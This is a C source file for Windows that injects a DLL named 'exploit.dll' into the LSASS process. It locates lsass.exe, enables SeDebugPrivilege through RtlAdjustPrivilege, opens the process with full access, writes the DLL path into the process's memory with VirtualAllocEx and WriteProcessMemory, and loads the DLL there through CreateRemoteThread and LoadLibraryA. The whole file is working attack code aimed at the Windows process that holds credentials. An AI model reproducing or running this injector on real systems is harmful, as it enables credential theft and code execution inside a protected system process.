#include <Windows.h>
#include <winnt.h>
#include <TlHelp32.h>
#include <psapi.h>

DWORD GetLsassPid() {
    DWORD Pid = -1;
    PROCESSENTRY32 Process;
    HANDLE ProcessSnapshot;
    Process.dwSize = sizeof(Process);

    ProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (ProcessSnapshot == INVALID_HANDLE_VALUE) {
        goto end;
    }

    if (!Process32First(ProcessSnapshot, &Process)) {
        goto end;
    }

    do {
        if (wcscmp(Process.szExeFile, L"lsass.exe")) {
            continue;
        }

        Pid = Process.th32ProcessID;
        break;
    } while (Process32Next(ProcessSnapshot, &Process));

end:
    if (ProcessSnapshot != INVALID_HANDLE_VALUE) {
        CloseHandle(ProcessSnapshot);
    }

    return Pid;
}

VOID main() {
    DWORD PathResult, LsassPid;
    HANDLE ProcessHandle = NULL, ThreadHandle = NULL;
    LPVOID Allocation = NULL;
    CHAR FullPath[MAX_PATH];
    UINT64 FuncAddr;
    ULONG PreviousValue;

    FuncAddr = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlAdjustPrivilege");
    if (!FuncAddr) {
        goto end;
    }

    // enable SeDebugPrivilege
    if (((NTSTATUS(WINAPI*)(ULONG, BOOL, BOOL, PULONG))FuncAddr)(0x14, TRUE, FALSE, &PreviousValue) != 0) {
        goto end;
    }

    PathResult = GetFullPathNameA("exploit.dll", sizeof(FullPath), FullPath, NULL);
    if (!PathResult || (PathResult > sizeof(FullPath))) {
        goto end;
    }

    LsassPid = GetLsassPid();
    if (LsassPid == -1) {
        goto end;
    }

    ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, LsassPid);
    if (!ProcessHandle) {
        goto end;
    }
    
    Allocation = VirtualAllocEx(ProcessHandle, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!Allocation) {
        goto end;
    }

    if (!WriteProcessMemory(ProcessHandle, Allocation, FullPath, sizeof(FullPath), NULL)) {
        goto end;
    }

    ThreadHandle = CreateRemoteThread(ProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA,
                                      Allocation, 0, NULL);

end:
    if (ThreadHandle) {
        CloseHandle(ThreadHandle);
    }

    if (ProcessHandle) {
        // only free the memory if thread creation was not successful
        if (!ThreadHandle && Allocation) {
            VirtualFreeEx(ProcessHandle, Allocation, 0, MEM_RELEASE);
        }

        CloseHandle(ProcessHandle);
    }
}
